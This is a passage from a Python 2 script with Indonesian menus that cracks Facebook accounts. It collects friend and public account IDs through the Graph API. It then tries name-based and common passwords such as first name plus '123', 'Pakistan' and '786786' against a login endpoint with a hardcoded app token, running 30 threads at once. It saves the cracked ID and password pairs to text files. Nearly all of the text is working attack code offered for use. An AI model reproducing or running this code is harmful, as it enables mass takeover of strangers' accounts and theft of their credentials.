                data2 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                naga2 = json.load(data2)
                if 'access_token' in naga2:
                    print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos2
                    oke.append(ubd + bos2)
                elif 'www.facebook.com' in naga2['error_msg']:
                    print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos2
                    cek = open('out/pakisbang.txt', 'a')
                    cek.write('ID:' + ubd + ' Pw:' + bos2 + '\n')
                    cek.close()
                    cpe.append(ubd + bos2)
                else:
                    bos3 = x['first_name'] + '12345'
                    data3 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    naga3 = json.load(data3)
                    if 'access_token' in naga3:
                        print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos3
                        oke.append(ubd + bos3)
                    elif 'www.facebook.com' in naga3['error_msg']:
                        print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos3
                        cek = open('out/pakisbang.txt', 'a')
                        cek.write('ID:' + ubd + ' Pw:' + bos3 + '\n')
                        cek.close()
                        cpe.append(ubd + bos3)
                    else:
                        bos4 = '786786'
                        data4 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        naga4 = json.load(data4)
                        if 'access_token' in naga4:
                            print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos4
                            oke.append(ubd + bos4)
                        elif 'www.facebook.com' in naga4['error_msg']:
                            print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos4
                            cek = open('out/pakisbang.txt', 'a')
                            cek.write('ID:' + ubd + ' Pw:' + bos4 + '\n')
                            cek.close()
                            cpe.append(ubd + bos4)
                        else:
                            bos5 = x['first_name'] + '786'
                            data5 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            naga5 = json.load(data5)
                            if 'access_token' in naga5:
                                print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos5
                                oke.append(ubd + bos5)
                            elif 'www.facebook.com' in naga5['error_msg']:
                                print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos5
                                cek = open('out/pakisbang.txt', 'a')
                                cek.write('ID:' + ubd + ' Pw:' + bos5 + '\n')
                                cek.close()
                                cpe.append(ubd + bos5)
                            else:
                                bos6 = x['last_name'] + '123'
                                data6 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                naga6 = json.load(data6)
                                if 'access_token' in naga6:
                                    print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos6
                                    oke.append(ubd + bos6)
                                elif 'www.facebook.com' in naga6['error_msg']:
                                    print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos6
                                    cek = open('out/pakisbang.txt', 'a')
                                    cek.write('ID:' + ubd + ' Pw:' + bos6 + '\n')
                                    cek.close()
                                    cpe.append(ubd + bos6)
                                else:
                                    bos7 = x['last_name'] + '1234'
                                    data7 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    naga7 = json.load(data7)
                                    if 'access_token' in naga7:
                                        print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos7
                                        oke.append(ubd + bos7)
                                    elif 'www.facebook.com' in naga7['error_msg']:
                                        print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos7
                                        cek = open('out/pakisbang.txt', 'a')
                                        cek.write('ID:' + ubd + ' Pw:' + bos7 + '\n')
                                        cek.close()
                                        cpe.append(ubd + bos7)
                                    else:
                                        bos8 = 'Pakistan'
                                        data8 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        naga8 = json.load(data8)
                                        if 'access_token' in naga8:
                                            print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos8
                                            oke.append(ubd + bos8)
                                        elif 'www.facebook.com' in naga8['error_msg']:
                                            print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos8
                                            cek = open('out/pakisbang.txt', 'a')
                                            cek.write('ID:' + ubd + ' Pw:' + bos8 + '\n')
                                            cek.close()
                                            cpe.append(ubd + bos8)
                                        else:
                                            bos9 = x['last_name'] + '786'
                                            data9 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            naga9 = json.load(data9)
                                            if 'access_token' in naga9:
                                                print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x9d\x82 ' + bos9
                                                oke.append(ubd + bos9)
                                            elif 'www.facebook.com' in naga9['error_msg']:
                                                print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x9d\x82 ' + bos9
                                                cek = open('out/pakisbang.txt', 'a')
                                                cek.write('ID:' + ubd + ' Pw:' + bos9 + '\n')
                                                cek.close()
                                                cpe.append(ubd + bos9)
                                            else:
                                                bos10 = x['last_name'] + '12345'
                                                data10 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                naga10 = json.load(data10)
                                                if 'access_token' in naga10:
                                                    print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos10
                                                    oke.append(ubd + bos10)
                                                elif 'www.facebook.com' in naga10['error_msg']:
                                                    print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos10
                                                    cek = open('out/pakisbang.txt', 'a')
                                                    cek.write('ID:' + ubd + ' Pw:' + bos10 + '\n')
                                                    cek.close()
                                                    cpe.append(ubd + bos10)
                                                else:
                                                    bos11 = 'Bangladesh'
                                                    data11 = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + ubd + '&locale=en_US&password=' + bos11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    naga11 = json.load(data11)
                                                    if 'access_token' in naga11:
                                                        print '\x1b[1;92m[Berhasil] ' + ubd + ' \xe2\x80\xa2 ' + bos11
                                                        oke.append(ubd + bos11)
                                                    elif 'www.facebook.com' in naga11['error_msg']:
                                                        print '\x1b[1;94m[Cekpoint] ' + ubd + ' \xe2\x80\xa2 ' + bos11
                                                        cek = open('out/pakisbang.txt', 'a')
                                                        cek.write('ID:' + ubd + ' Pw:' + bos11 + '\n')
                                                        cek.close()
                                                        cpe.append(ubd + bos11)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;94m+\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;94m+\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;94mCP \x1b[1;97m: \x1b[1;92m' + str(len(oke)) + '\x1b[1;97m/\x1b[1;94m' + str(len(cpe))
    print '\x1b[1;97m[\x1b[1;94m+\x1b[1;97m] \x1b[1;97mCP file tersimpan : out/pakisbang.txt'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
    os.system('python2 XXXXX.py')


def sandi():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken Invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;96m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari Daftar Teman'
    print '\x1b[1;97m[\x1b[1;96m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari ID Publik / Teman'
    print '\x1b[1;97m[\x1b[1;96m03\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Crack dari File'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Kembali'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    pilih_sandi()


def pilih_sandi():
    weak = raw_input('\x1b[1;93m-> \x1b[91m:\x1b[1;92m ')
    if weak == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_sandi()
    elif weak == '1' or weak == '01':
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        print '\x1b[1;93m       \xf0\x9f\xa4\xa1  \x1b[1;97mBUAT LIST PASSWORD\x1b[1;93m  \xf0\x9f\xa4\xa1'
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 1 : NamaDepan123 '
        print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 2 : NamaDepan1234 '
        print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 3 : NamaDepan12345 '
        sandi4 = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 4 : ')
        sandi5 = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 5 : ')
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])
        
    elif weak == '2' or weak == '02':
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        print '\x1b[1;93m       \xf0\x9f\xa4\xa1  \x1b[1;97mBUAT LIST PASSWORD\x1b[1;93m  \xf0\x9f\xa4\xa1'
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 1 : NamaDepan123 '
        print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 2 : NamaDepan1234 '
        print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 3 : NamaDepan12345 '
        sandi4 = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 4 : ')
        sandi5 = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 5 : ')
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        idt = raw_input('\x1b[1;97m{\x1b[1;96m+\x1b[1;97m} ID Publik / Teman : ')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m{\x1b[1;96m\xe2\x9c\x93\x1b[1;97m} Nama : ' + op['name']
        except KeyError:
            print '[!] ID Publik Tidak Ditemukan!'
            raw_input('\n[ Kembali ]')
            sandi()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
        z = json.loads(r.text)
        for i in z['data']:
            id.append(i['id'])
        
    elif weak == '3' or weak == '03':
        os.system('clear')
        print logo
        
        try:
            print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
            print '\x1b[1;93m       \xf0\x9f\xa4\xa1  \x1b[1;97mBUAT LIST PASSWORD\x1b[1;93m  \xf0\x9f\xa4\xa1'
            print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
            print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 1 : NamaDepan123 '
            print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 2 : NamaDepan1234 '
            print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 3 : NamaDepan12345 '
            sandi4 = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 4 : ')
            sandi5 = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Sandi 5 : ')
            print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
            idlist = raw_input('\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Nama File : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except KeyError:
            print '\x1b[1;91m[!] File Tidak Ada'
            raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            sandi()
        except IOError:
            print '\x1b[1;91m[!] File Tidak Ada'
            raw_input('\n\x1b[1;92m[ \x1b[1;97mKembali \x1b[1;92m]')
            sandi()
        

    if weak == '0' or weak == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        pilih_indo()
    print '\x1b[1;97m{\x1b[1;96m+\x1b[1;97m} Total ID : ' + str(len(id))
    print '\x1b[1;97m{\x1b[1;96m?\x1b[1;97m} Stop CTRL+Z'
    titik = [
        '.   ',
        '..  ',
        '... ']
    for o in titik:
        print '\r\x1b[1;97m{\x1b[1;96m\xe2\x80\xa2\x1b[1;97m} Crack Berjalan ' + o,
        sys.stdout.flush()
        time.sleep(1)
    
    print '\n\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    
    def main(arg):
        user = arg
        
        try:
            os.mkdir('out')
        except OSError:
            pass

        
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            c = json.loads(a.text)
            sandi1 = c['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + sandi1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            w = json.load(data)
            if 'access_token' in w:
                print '\x1b[1;92m[Berhasil] ' + user + ' \xe2\x9d\x82 ' + sandi1
                oks.append(user + sandi1)
            elif 'www.facebook.com' in w['error_msg']:
                print '\x1b[1;91m[Cekpoint] ' + user + ' \xe2\x9d\x82 ' + sandi1
                cek = open('out/world.txt', 'a')
                cek.write('ID:' + user + ' Pw:' + sandi1 + '\n')
                cek.close()
                cekpoint.append(user + sandi1)
            else:
                sandi2 = c['first_name'] + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + sandi2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                w = json.load(data)
                if 'access_token' in w:
                    print '\x1b[1;92m[Berhasil] ' + user + ' \xe2\x9d\x82 ' + sandi2
                    oks.append(user + sandi2)
                elif 'www.facebook.com' in w['error_msg']:
                    print '\x1b[1;91m[Cekpoint] ' + user + ' \xe2\x9d\x82 ' + sandi2
                    cek = open('out/world.txt', 'a')
                    cek.write('ID:' + user + ' Pw:' + sandi2 + '\n')
                    cek.close()
                    cekpoint.append(user + sandi2)
                else:
                    sandi3 = c['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + sandi3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    w = json.load(data)
                    if 'access_token' in w:
                        print '\x1b[1;92m[Berhasil] ' + user + ' \xe2\x9d\x82 ' + sandi3
                        oks.append(user + sandi3)
                    elif 'www.facebook.com' in w['error_msg']:
                        print '\x1b[1;91m[Cekpoint] ' + user + ' \xe2\x9d\x82 ' + sandi3
                        cek = open('out/world.txt', 'a')
                        cek.write('ID:' + user + ' Pw:' + sandi3 + '\n')
                        cek.close()
                        cekpoint.append(user + sandi3)
                    else:
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + sandi4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        w = json.load(data)
                        if 'access_token' in w:
                            print '\x1b[1;92m[Berhasil] ' + user + ' \xe2\x9d\x82 ' + sandi4
                            oks.append(user + sandi4)
                        elif 'www.facebook.com' in w['error_msg']:
                            print '\x1b[1;91m[Cekpoint] ' + user + ' \xe2\x9d\x82 ' + sandi4
                            cek = open('out/world.txt', 'a')
                            cek.write('ID:' + user + ' Pw:' + sandi4 + '\n')
                            cek.close()
                            cekpoint.append(user + sandi4)
                        else:
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + sandi5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            w = json.load(data)
                            if 'access_token' in w:
                                print '\x1b[1;92m[Berhasil] ' + user + ' \xe2\x9d\x82 ' + sandi5
                                oks.append(user + sandi5)
                            elif 'www.facebook.com' in w['error_msg']:
                                print '\x1b[1;91m[Cekpoint] ' + user + ' \xe2\x9d\x82 ' + sandi5
                                cek = open('out/world.txt', 'a')
                                cek.write('ID:' + user + ' Pw:' + sandi5 + '\n')
                                cek.close()
                                cekpoint.append(user + sandi5)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;96m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSelesai ....'
    print '\x1b[1;97m[\x1b[1;96m+\x1b[1;97m] \x1b[1;97mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;91mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;91m' + str(len(cekpoint))
    print '\x1b[1;97m[\x1b[1;96m!\x1b[1;97m] \x1b[1;97mCP file tersimpan : out/world.txt'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    raw_input('\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
    os.system('python2 XXXXX.py')


def dump():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        menu()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;95m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Ambil ID dari Daftar Teman '
    print '\x1b[1;97m[\x1b[1;95m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Ambil ID dari Publik / Teman '
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Kembali '
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    dump_pilih()


def dump_pilih():
    cuih = raw_input('\x1b[1;93m-> \x1b[91m:\x1b[1;92m ')
    if cuih == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        dump_pilih()
    elif cuih == '1' or cuih == '01':
        id_teman()
    elif cuih == '2' or cuih == '02':
        idfrom_teman()
    elif cuih == '0' or cuih == '00':
        menu()
    else:
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Isi Yg Benar !'
        dump_pilih()


def id_teman():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;97m[!] Token Invalid'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil Semua ID Teman \x1b[1;97m...')
        bz = open('out/id_teman.txt', 'w')
        for a in z['data']:
            idteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[\x1b[1;95m' + str(len(idteman)) + '\x1b[1;97m]\x1b[1;97m =>',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;93m' + a['id']
        
        bz.close()
        print '\r\x1b[1;97m[\x1b[1;95m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m....'
        print '\r\x1b[1;97m[\x1b[1;95m!\x1b[1;97m] \x1b[1;97mTotal ID : %s' % len(idteman)
        done = raw_input('\r\x1b[1;97m[\x1b[1;95m?\x1b[1;97m] \x1b[1;97mSimpan Nama File : ')
        os.rename('out/id_teman.txt', 'out/' + done)
        print '\r\x1b[1;97m[\x1b[1;95m+\x1b[1;97m] \x1b[1;97mFile Tersimpan : \x1b[1;97mout/' + done
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        raw_input('\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 XXXXX.py')
    except IOError:
        print '\x1b[1;91m[!] Gagal Membuat File'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97m[!] Terhenti !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except KeyError:
        print '\x1b[1;91m[!] Gagal !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except OSError:
        print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m]\x1b[1;97m File Anda Tidak Tersimpan !'
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 XXXXX.py')
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\xc3\x97] Tidak Ada Koneksi !'
        keluar()



def idfrom_teman():
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(0.01)
        login()

    
    try:
        os.mkdir('out')
    except OSError:
        pass

    
    try:
        os.system('clear')
        print logo
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        idt = raw_input('\x1b[1;97m[\x1b[1;95m+\x1b[1;97m] ID Publik / Teman : ')
        
        try:
            jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
            op = json.loads(jok.text)
            print '\x1b[1;97m[\x1b[1;95m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mNama : ' + op['name']
        except KeyError:
            print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m] ID Publik / Teman Tidak Ada !'
            raw_input('\n\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
            dump()

        r = requests.get('https://graph.facebook.com/' + idt + '?fields=friends.limit(50000)&access_token=' + toket)
        z = json.loads(r.text)
        jalan('\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] \x1b[1;97mMengambil Semua ID ...')
        print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
        bz = open('out/id_teman_from_teman.txt', 'w')
        for a in z['friends']['data']:
            idfromteman.append(a['id'])
            bz.write(a['id'] + '\n')
            print '\r\x1b[1;97m[ \x1b[1;92m' + str(len(idfromteman)) + '\x1b[1;97m ]\x1b[1;97m=> \x1b[1;97m',
            sys.stdout.flush()
            time.sleep(0.005)
            print '\x1b[1;93m ' + a['id']
        
        bz.close()
        print '\r\x1b[1;97m[\x1b[1;95m\xe2\x9c\x93\x1b[1;97m] \x1b[1;97mSukses Mengambil ID \x1b[1;97m....'
        print '\r\x1b[1;97m[\x1b[1;95m\xe2\x80\xa2\x1b[1;97m] Total ID : %s' % len(idfromteman)
        done = raw_input('\r\x1b[1;97m[\x1b[1;95m+\x1b[1;97m] \x1b[1;97mSimpan Nama File : ')
        os.rename('out/id_teman_from_teman.txt', 'out/' + done)
        print '\r\x1b[1;91m[\x1b[1;95m\xe2\x88\x9a\x1b[1;97m] File Tersimpan : out/' + done
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        dump()
    except OSError:
        print '\x1b[1;97m[!] File Tidak Tersimpan '
        raw_input('\n\x1b[1;93m[ \x1b[1;97mKembali \x1b[1;93m]')
        os.system('python2 XXXXX.py')
    except IOError:
        print '\x1b[1;97m[!] Error creating file'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        os.system('python2 XXXXX.py')
    except (KeyboardInterrupt, EOFError):
        print '\x1b[1;97m[!] Terhenti'
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        dump()
    except KeyError:
        print '\x1b[1;97m[\x1b[1;95m!\x1b[1;97m] Teman Tidak Ada !'
        raw_input('\n\x1b[1;93m[\x1b[1;97m Kembali \x1b[1;93m]')
        dump()
    except requests.exceptions.ConnectionError:
        print '\x1b[1;97m[\x1b[1;91m\xe2\x9c\x96\x1b[1;97m] Tidak Ada Koneksi !'
        keluar()



def guard():
    global toket
    os.system('clear')
    
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[91m[!] Token not found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    print '\x1b[1;97m[\x1b[1;90m01\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Aktifkan Profile Guard'
    print '\x1b[1;97m[\x1b[1;90m02\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Nonaktifkan Profile Guard'
    print '\x1b[1;97m[\x1b[1;91m00\x1b[1;97m]\x1b[1;96m->\x1b[1;97m Kembali'
    print '\x1b[1;92m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'
    guard_pilih()


def guard_pilih():
    guar = raw_input('\x1b[1;93m\xef\xb8\xbb\xe3\x83\x87\xe2\x95\x90\xe4\xb8\x80\xe2\x96\xb8 \x1b[91m:\x1b[1;92m ')
    if guar == '':
        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m Isi Yg Benar !'
        guard_pilih()
    elif guar == '1' or guar == '01':
        aktif = 'true'
        gaz(toket, aktif)
    elif guar == '2' or guar == '02':
        non = 'false'
        gaz(toket, non)
